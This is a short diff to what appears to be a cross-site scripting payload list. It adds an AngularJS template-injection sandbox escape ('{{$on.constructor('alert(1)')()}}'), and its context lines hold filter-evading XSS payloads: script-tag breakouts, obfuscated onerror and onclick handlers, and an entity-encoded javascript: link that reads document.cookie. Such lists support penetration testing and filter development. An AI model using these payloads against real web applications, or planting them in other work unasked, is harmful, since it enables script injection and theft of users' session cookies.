@@ -1,6 +1,7 @@
 ‘>alert(154)</script><script/154=’;;;;;;;
 '>alert(154)</script><script/154=';;;;;;;
 <img src="X" onerror=top[8680439..toString(30)](1337)>
+{{$on.constructor('alert(1)')()}}
 <script>top[8680439..toString(30)](1337)</script>
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
